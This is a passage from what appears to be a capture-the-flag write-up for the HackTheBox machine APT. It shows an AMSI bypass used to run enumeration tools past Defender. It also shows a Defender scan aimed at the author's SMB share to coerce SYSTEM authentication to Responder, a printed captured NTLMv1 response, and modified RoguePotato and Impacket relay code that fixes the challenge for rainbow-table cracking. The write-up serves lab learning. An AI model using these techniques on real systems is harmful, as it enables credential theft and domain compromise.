+<p>Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.</p>
+</blockquote>
+<p>NTLMv1 is insecure, and can be abused. I’ll verify it is set that way on APT:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"</span><span class="w"> </span><span class="nx">lmcompatibilitylevel</span><span class="w">
+</span><span class="go">
+
+lmcompatibilitylevel : 2
+PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+PSChildName          : Lsa
+PSDrive              : HKLM
+PSProvider           : Microsoft.PowerShell.Core\Registry
+</span></code></pre></div></div>
+<h4 id="winpeas---fail">WinPeas - Fail</h4>
+<p>If I’d missed the history file, I tried to find it with WinPeas. I uploaded the <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a> exe and tried to run it, but Defender ate it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp&gt;</span><span class="w"> </span><span class="nf">upload</span> <span class="nv">/opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe</span>
+<span class="go">Info: Uploading /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe to C:\Users\henry.vinson_adm\AppData\local\temp\winPEAS.exe
+
+                                                             
+Data: 629416 bytes of 629416 bytes copied
+
+Info: Upload successful!
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp&gt;</span><span class="w"> </span><span class="nf">ls</span>
+<span class="go">
+
+    Directory: C:\Users\henry.vinson_adm\AppData\local\temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/5/2021   6:10 PM         472064 winPEAS.exe
+
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp&gt;</span><span class="w"> </span><span class="nf">.\winPEAS.exe</span>
+<span class="go">Program 'winPEAS.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\winPEAS.exe
++ ~~~~~~~~~~~~~.
+At line:1 char:1
++ .\winPEAS.exe
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+</span></code></pre></div></div>
+<p>I was able to bypass this using some builtin features of <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>. First, I’ll run <code class="language-plaintext highlighter-rouge">menu</code> and then <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code> to disable AMSI:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp&gt;</span><span class="w"> </span><span class="nf">menu</span>
+<span class="go">
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /    
+        \/                               \/          \/       \/         \/      
+              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers
+
+[+] Bypass-4MSI
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp&gt;</span><span class="w"> </span><span class="nf">Bypass-4MSI</span>
+<span class="go">[+] Patched! :D
+</span></code></pre></div></div>
+<p>Now I can use <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> to load an EXE from my system into memory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp&gt;</span><span class="w"> </span><span class="nf">Invoke-Binary</span> <span class="nv">/opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>This method of running does seem to cache all the output and then dump it once the process is complete, so it can take some patience to wait for output to come. WinPEAS didn’t identify the NTLM insecurity.</p>
+<h4 id="seatbelt">Seatbelt</h4>
+<p><a href="https://github.com/GhostPack/Seatbelt#command-groups">Seatbelt</a> is another enumeration script writing in C#. It has the same issues with AMSI/Defender as WinPEAS, and can be bypassed the same way.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt;</span><span class="w"> </span><span class="nf">Invoke-Binary</span> <span class="nf">.</span><span class="nv">/Seatbelt.exe</span> <span class="nf">-group=all</span>
+<span class="go">...[snip]...
+====== NTLMSettings ======
+
+  LanmanCompatibilityLevel    : 2(Send NTLM response only)
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : True
+      ServerNegotiateSigning  : True
+      LdapSigning             : 1 (Negotiate signing)
+
+  Session Security
+      NTLMMinClientSec        : 536870912 (Require128BitKey)
+        [!] NTLM clients support NTLMv1!
+      NTLMMinServerSec        : 536870912 (Require128BitKey)
+
+        [!] NTLM services on this machine support NTLMv1!
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     : (Not defined)
+      OutboundRestrictions    : (Not defined)
+      InboundAuditing         : (Not defined)
+      OutboundExceptions      :   
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="strategy">Strategy</h3>
+<p>The goal here is to capture a Net-NTLMv1 hash that I can send to crack.sh. Net-NTLM is a <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1">challenge response protocol</a>, where the client (APT) reached out to the server and says “I’m ABC”, the server (in this case Responder) says “If you are ABC, prove it on this random 8-bytes”. The client does a computation using it’s NTLM hash (derived from the password), and sends it back. Assuming the legit server has access to that hash, it can verify that client did too.</p>
+<p>Net-NTLMv1 responses (often referred to as hashes, but not really a hash) use weak crypto. <a href="https://crack.sh/netntlm/">crack.sh</a> has a service for cracking them using rainbow tables. Rainbow tables are just precomputed tables of tons of possible inputs mapped the the results. For example, someone can spend months calculating a given hash of all possible inputs, and then forever use these tables to map hashes back to inputs.</p>
+<p>Typically a way to defeat rainbow tables is to have unique salts per hash. This makes all the passwords significantly more random, and reduces the effectiveness of rainbow tables. Something like a Net-NTLM won’t work with rainbow tables if you passively capture the exchange, because there’s a unique challenge generated by the server for each connection. What crack.sh has done is create rainbow tables for the specific challenge of “1122334455667788”. In a case like this, where the server is under malicious control, it can set that challenge to always be that specific value that was used for the rainbow table generation. This is all described on the crack.sh page.</p>
+<p>I’ll need a method to get the System account to reach out to my server so that I can capture that hash. I’ll show two.</p>
+<ol>
+<li>Task Defender to scan a file on a share on my host. I believe Microsoft has since disabled on demand scans of SMB shares, but it works on APT. This has the added benefits of working over SMB, so I can use responder to capture the hash, and it’s just an outbound IPv4 connection.</li>
+<li>Using <a href="https://github.com/antonioCoco/RoguePotato">Rogue Potato</a> to generate an RPC connection. I’ll need a custom RPC server to set the specific challenge and print the result. I’ll also have to modify RoguePotato to talk IPv6, as the RPC server will need to talk back to APT on 445, which isn’t listening on IPv4.</li>
+</ol>
+<h3 id="collect-net-ntlmv1-via-smb--defender--responder">Collect Net-NTLMv1 [Via SMB / Defender / Responder]</h3>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus">This Technet page</a> gives details on how to initiate a Defender scan of a specific file. <code class="language-plaintext highlighter-rouge">MpCmdRun</code> is in <code class="language-plaintext highlighter-rouge">%ProgramFiles\Windows Defender</code>. I’ll use these options:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-Scan</code> will initiate a scan</li>
+<li><code class="language-plaintext highlighter-rouge">-ScanType 3</code> will do just a specific file, as opposed to a full (2) or quick scan (1)</li>
+<li><code class="language-plaintext highlighter-rouge">-file \\10.10.14.9\share\does_exist.exe</code> will tell Defender to scan the file on my SMB share (which doesn’t have to exist, as Windows will authenticate before finding it’s not there).</li>
+</ul>
+<p>Before I start <a href="https://github.com/SpiderLabs/Responder">Responder</a>, I’ll edit <code class="language-plaintext highlighter-rouge">/etc/responder/Responder.conf</code> to set the challenge to <code class="language-plaintext highlighter-rouge">1122334455667788</code>, the pattern that crack.sh has used in its rainbow tables. I’ll start <code class="language-plaintext highlighter-rouge">responder</code>, giving it the <code class="language-plaintext highlighter-rouge">--lm</code> flag to try to force a downgrade to Net-NTLMv1:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>With Responder waiting, I’ll initiate the Defender scan:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Program Files\windows defender&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\MpCmdRun.exe</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="nx">3</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nx">\\10.10.14.9\share\file.txt</span><span class="w">
+</span><span class="go">Scan starting...
+CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
+</span></code></pre></div></div>
+<p>At Responder, there’s a challenge response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Listening for events...                             
+[SMB] NTLMv1 Client   : 10.10.10.213                  
+[SMB] NTLMv1 Username : HTB\APT$                  
+[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788   
+</code></pre></div></div>
+<h3 id="collect-net-ntlmv1-via-rpc--roguepotato">Collect Net-NTLMv1 [Via RPC / RoguePotato]</h3>
+<p>This is the author’s intended solution. I’ll do my best to explain it here, but it’s not something I could have come up with on my own.</p>
+<h4 id="update-roguepotato">Update Rogue/Potato</h4>
+<p>RoguePotato won’t work to get execution as System because henry.vinson_adm doesn’t have <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>. Still, it will generate the RPC call and Net-NTLM auth as SYSTEM, which is what I’m trying to capture here. With the Impacket tools, RPC is a bit hard to work with and unstable, so it’s easier to accept the RPC connection, and use SMB to do the NTLM authentication. The challenge there is that SMB is not listening on IPv4, so I’ll need to update RoguePotato to work with an IPv6 address.</p>
+<p>I’ll clone the <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato Git repo</a> into my Windows VM and open the project in Visual Studio. I’ll build the solution to make sure it builds before I edit it, and it does.</p>
+<p>In <code class="language-plaintext highlighter-rouge">RoguePotato.cpp</code>, there’s a global variable, <code class="language-plaintext highlighter-rouge">remote_ip</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210405151035633.webp" type="image/webp"/>
+<img alt="image-20210405151035633" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210405151035633.png"/>
+</picture>
+<p>It is set here based on the command line arguments. Searching in the “Solutions Explorer”, it’s used in another file, <code class="language-plaintext highlighter-rouge">IStorageTrigger.cpp</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210405151153981.webp" type="image/webp"/>
+<img alt="image-20210405151153981" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210405151153981.png"/>
+</picture>
+<p>It’s converted here from a wide-character string to a multibyte string (<code class="language-plaintext highlighter-rouge">wcstombs</code>):</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
+<span class="n">HRESULT</span> <span class="n">IStorageTrigger</span><span class="p">::</span><span class="nf">MarshalInterface</span><span class="p">(</span><span class="n">IStream</span><span class="p">*</span> <span class="n">pStm</span><span class="p">,</span> <span class="k">const</span> <span class="n">IID</span><span class="p">&amp;</span> <span class="n">riid</span><span class="p">,</span> <span class="k">void</span><span class="p">*</span> <span class="n">pv</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwDestContext</span><span class="p">,</span> <span class="k">void</span><span class="p">*</span> <span class="n">pvDestContext</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">mshlflags</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">short</span> <span class="n">sec_len</span> <span class="p">=</span> <span class="m">8</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">remote_ip_mb</span><span class="p">[</span><span class="m">16</span><span class="p">];</span>
+    <span class="nf">wcstombs</span><span class="p">(</span><span class="n">remote_ip_mb</span><span class="p">,</span> <span class="n">remote_ip</span><span class="p">,</span> <span class="m">16</span><span class="p">);</span>
+    <span class="kt">char</span><span class="p">*</span> <span class="n">ipaddr</span> <span class="p">=</span> <span class="n">remote_ip_mb</span><span class="p">;</span>
+    <span class="n">unsigned</span> <span class="kt">short</span> <span class="n">str_bindlen</span> <span class="p">=</span> <span class="p">(</span><span class="n">unsigned</span> <span class="kt">short</span><span class="p">)((</span><span class="nf">strlen</span><span class="p">(</span><span class="n">ipaddr</span><span class="p">))</span> <span class="p">*</span> <span class="m">2</span><span class="p">)</span> <span class="p">+</span> <span class="m">6</span><span class="p">;</span>
+    <span class="n">unsigned</span> <span class="kt">short</span> <span class="n">total_length</span> <span class="p">=</span> <span class="p">(</span><span class="n">str_bindlen</span> <span class="p">+</span> <span class="n">sec_len</span><span class="p">)</span> <span class="p">/</span> <span class="m">2</span><span class="p">;</span>
+    <span class="n">unsigned</span> <span class="kt">char</span> <span class="n">sec_offset</span> <span class="p">=</span> <span class="n">str_bindlen</span> <span class="p">/</span> <span class="m">2</span><span class="p">;</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
+</code></pre></div></div>
+<p>It will only read the first 16 bytes as is, which is enough to hold an IPv4 address as string (four groups of one to three digits + three periods and a newline or null). An IPv6 address is 16 bytes, but when represented as a string, will be eight groups of four characters plus <code class="language-plaintext highlighter-rouge">:</code> between each group, so up to 40 bytes. I’ll update those two lines:</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">char</span> <span class="n">remote_ip_mb</span><span class="p">[</span><span class="m">40</span><span class="p">];</span>
+    <span class="nf">wcstombs</span><span class="p">(</span><span class="n">remote_ip_mb</span><span class="p">,</span> <span class="n">remote_ip</span><span class="p">,</span> <span class="m">40</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Luckily for me, the rest of the code is built off the length of this, so it should work with no additional changes. I’ll build the solution and copy the new binary back to my Parrot VM.</p>
+<p><em>Note: IppSec mentioned he had some issue with RoguePotato being eaten by Defender on APT. I didn’t have to do any evasion, yet he did the same thing and did. It must come down to Visual Studio version, compiler settings, or other odd things like that. If you happen to have issues, his video would be a good place to watch for how he gets around it.</em></p>
+<h4 id="rpc-server-strategy">RPC Server Strategy</h4>
+<p>Now that RoguePotato will initiate an RPC connection back to me, I want an RPC server that will send the specific challenge <code class="language-plaintext highlighter-rouge">1122334455667788</code> that will work with the rainbow tables at Crack.sh.</p>
+<p>The idea is to start with <code class="language-plaintext highlighter-rouge">ntmlrelayx.py</code>, a script in the Impacket examples that is used to perform relay attacks. By default it has SMB, HTTP, and <a href="https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/">recently added</a> WCF / ADWS servers. The idea is that the attacker gets the victim somehow to connect to one of these servers, and then use that to gain authentication (over one of many potential protocols that authenticate with Net-NTLM) at a different server as the victim. <a href="https://www.secureauth.com/blog/playing-with-relayed-credentials/">This post</a> does a good job explaining that in further detail, and has this really nice diagram:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/flavors-of-attack.webp" type="image/webp"/>
+<img alt="flavors of attack" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/flavors-of-attack.jpg"/>
+</picture>
+<p><a href="https://gist.github.com/Gilks/0fc75929faba704c05143b01f34c291b">This patch</a> will update an older Impact version to add an RPC server in <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code>. That server still wants to reach out to a target (step 2 above) and get a challenge (3) to send back to the victim for verification. I’ll want to modify it to not have a target, but just send the same challenge back (1122334455667788). In reality, this could all be done over RPC, but doing so with Impacket was unstable, so the code will switch to SMB to do the NTLM negotiation.</p>
+<p>Even with people telling me the path and giving me code samples, this took a ton of debugging trial and error to get working. IppSec and I spent several hours on a call adding print statements and <code class="language-plaintext highlighter-rouge">pdb</code> breaks to try to get this working. I don’t have a good way to recreate all that troubleshooting in a blog post. But, if you’re working with Python code, the line <code class="language-plaintext highlighter-rouge">import pdb;pdb.set_trace()</code> is really a friend!</p>
+<h4 id="create-rpc-server">Create RPC Server</h4>
+<p>If I try to apply the patch to the most recent Impacket release, it will fail. The gist with the patch was released seven months ago, so the latest release at the point was <a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_21">0.9.21</a>. This patch is actually expecting to be run against Impact <a href="https://github.com/SecureAuthCorp/impacket/commit/3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8">commit 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8</a>, which is a few commits after that release (it took some trial and error to find that commit that accepted the patch). I’ll clone the repo, check out that commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>git clone https://github.com/SecureAuthCorp/impacket.git
+<span class="go">Cloning into 'impacket'...                                          
+remote: Enumerating objects: 41, done.                                                                                                  
+remote: Counting objects: 100% (41/41), done.
+remote: Compressing objects: 100% (33/33), done.
+remote: Total 18922 (delta 25), reused 20 (delta 8), pack-reused 18881
+Receiving objects: 100% (18922/18922), 6.27 MiB | 10.70 MiB/s, done.
+Resolving deltas: 100% (14401/14401), done.  
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cd </span>impacket  
+<span class="gp">oxdf@parrot$</span><span class="w"> </span>git checkout 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8
+<span class="go">HEAD is now at 3b0ff40c Added missing MSRPC_RTS cons
+</span></code></pre></div></div>
+<p>I’ll download and apply the patch:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>wget https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch
+<span class="go">...[snip]...
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>git apply <span class="nt">--whitespace</span><span class="o">=</span>fix <span class="nt">--reject</span> rpcrelayclientserver.patch
+<span class="go">...[snip]...
+Applied patch examples/ntlmrelayx.py cleanly.
+Applied patch impacket/dcerpc/v5/dcomrt.py cleanly.
+Applied patch impacket/dcerpc/v5/rpcrt.py cleanly.
+Applied patch impacket/examples/ntlmrelayx/attacks/rpcattack.py cleanly.
+Applied patch impacket/examples/ntlmrelayx/clients/rpcrelayclient.py cleanly.
+Applied patch impacket/examples/ntlmrelayx/servers/__init__.py cleanly.
+Applied patch impacket/examples/ntlmrelayx/servers/rpcrelayserver.py cleanly.
+Applied patch impacket/ntlm.py cleanly.
+Applied patch tests/SMB_RPC/test_ldap.py cleanly.
+Applied patch tests/SMB_RPC/test_rpcrt.py cleanly.
+Applied patch tests/SMB_RPC/test_samr.py cleanly.
+warning: squelched 3 whitespace errors
+warning: 4 lines applied after fixing whitespace errors.
+</span></code></pre></div></div>
+<p>It’s important that all the patches are applied cleanly. If there are any rejections, something went wrong.</p>
+<p>Next, I’ll update <code class="language-plaintext highlighter-rouge">impacket/examples/ntlmrelayx/servers/rpcrelayserver.py</code>. This file was added by the patch, and handles the  RPC server. In the <code class="language-plaintext highlighter-rouge">setup</code> function of the <code class="language-plaintext highlighter-rouge">RPCHandler</code> class, it currently manages grabbing a target for the relay from a list of targets. I don’t need this, so I’ll modify that to not bother with it, but rather setting the target to SMB on the client address:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+    <span class="n">self</span><span class="p">.</span><span class="n">transport</span> <span class="o">=</span> <span class="nc">DCERPCServer</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">request</span><span class="p">)</span>
+    <span class="n">IObjectExporterCallBacks</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mi">5</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">send_ServerAlive2Response</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">self</span><span class="p">.</span><span class="n">transport</span><span class="p">.</span><span class="nf">addCallbacks</span><span class="p">(</span><span class="nf">bin_to_uuidtup</span><span class="p">(</span><span class="n">IID_IObjectExporter</span><span class="p">),</span> <span class="sh">"</span><span class="s">135</span><span class="sh">"</span><span class="p">,</span> <span class="n">IObjectExporterCallBacks</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">target</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="c1"># Reflection mode, defaults to SMB at the target, for now
+</span>        <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="nc">TargetsProcessor</span><span class="p">(</span><span class="n">singleTarget</span><span class="o">=</span><span class="sh">'</span><span class="s">SMB://%s:445/</span><span class="sh">'</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="nf">getTarget</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
+        <span class="n">LOG</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">RPCD: Received connection from %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">do_ntlm_negotiate</code> function currently managed the challenge response between the incoming client and the relay target. I’ll replace all of that with code that will use the known challenge. I’ll also disable ESS (Extended Session Security).</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">do_ntlm_negotiate</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
+    <span class="n">self</span><span class="p">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="nf">getTarget</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
+    <span class="n">self</span><span class="p">.</span><span class="n">client</span> <span class="o">=</span> <span class="n">smbrelayclient</span><span class="p">.</span><span class="nc">SMBRelayClient</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">config</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">target</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">self</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="nf">initConnection</span><span class="p">():</span>
+        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to connect to SMB</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">challengeMessage</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">client</span><span class="p">.</span><span class="nf">sendNegotiate</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">challengeMessage</span><span class="p">[</span><span class="sh">'</span><span class="s">challenge</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">1122334455667788</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">challengeMessage</span><span class="p">.</span><span class="nf">getData</span><span class="p">())</span>
+        <span class="n">data</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf7</span> <span class="c1"># 0xf7 == NTLMSSP_Disable_ESS
+</span>        <span class="n">self</span><span class="p">.</span><span class="n">challengeMessage</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
+</code></pre></div></div>
+<p>For some reason, I found that <code class="language-plaintext highlighter-rouge">self.target</code> was being unset to None between <code class="language-plaintext highlighter-rouge">setup</code> and this call, so I reset it at the top.</p>
+<p>For that code to work, I’ll need to import <code class="language-plaintext highlighter-rouge">smbrelayclient</code> at the top of the file:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">impacket.examples.ntlmrelayx.clients</span> <span class="kn">import</span> <span class="n">smbrelayclient</span>
+</code></pre></div></div>
+<p>Next, the <code class="language-plaintext highlighter-rouge">negotiate_ntlm_session</code> function handles the negotiation. It starts with a bit <code class="language-plaintext highlighter-rouge">if</code> / <code class="language-plaintext highlighter-rouge">elif</code> statement based on the <code class="language-plaintext highlighter-rouge">messageType</code> coming in. The <code class="language-plaintext highlighter-rouge">NTLMSSP_AUTH_CHALLENGE_RESPONSE</code> message contains the challenge I want to capture to try to crack. In the relay scenario, it will take this hash and forward it on to try to get auth. I’ll replace all of that with two lines to print the result.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">elif</span> <span class="n">messageType</span> <span class="o">==</span> <span class="n">NTLMSSP_AUTH_CHALLENGE_RESPONSE</span><span class="p">:</span>
+    <span class="n">authenticateMessage</span> <span class="o">=</span> <span class="n">ntlm</span><span class="p">.</span><span class="nc">NTLMAuthChallengeResponse</span><span class="p">()</span>         
+    <span class="n">authenticateMessage</span><span class="p">.</span><span class="nf">fromString</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>                   
+    <span class="n">ntlm_hash_data</span> <span class="o">=</span> <span class="nf">outputToJohnFormat</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">1122334455667788</span><span class="sh">'</span><span class="p">),</span> <span class="n">authenticateMessage</span><span class="p">[</span><span class="sh">'</span><span class="s">user_name</span><span class="sh">'</span><span class="p">],</span> <span class="n">authenticateMessage</span><span class="p">[</span><span class="sh">'</span><span class="s">domain_name</span><span class="sh">'</span><span class="p">],</span> <span class="n">authenticateMessage</span><span class="p">[</span><span class="sh">'</span><span class="s">lanman</span><span class="sh">'</span><span class="p">],</span> <span class="n">authenticateMessage</span><span class="p">[</span><span class="sh">'</span><span class="s">ntlm</span><span class="sh">'</span><span class="p">])</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">ntlm_hash_data</span><span class="p">[</span><span class="sh">'</span><span class="s">hash_string</span><span class="sh">'</span><span class="p">],</span> <span class="n">ntlm_hash_data</span><span class="p">[</span><span class="sh">'</span><span class="s">hash_version</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="k">else</span><span class="p">:</span>                                    
+    <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sh">"</span><span class="s">Unknown NTLMSSP MessageType %d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">messageType</span><span class="p">)</span>
+</code></pre></div></div>
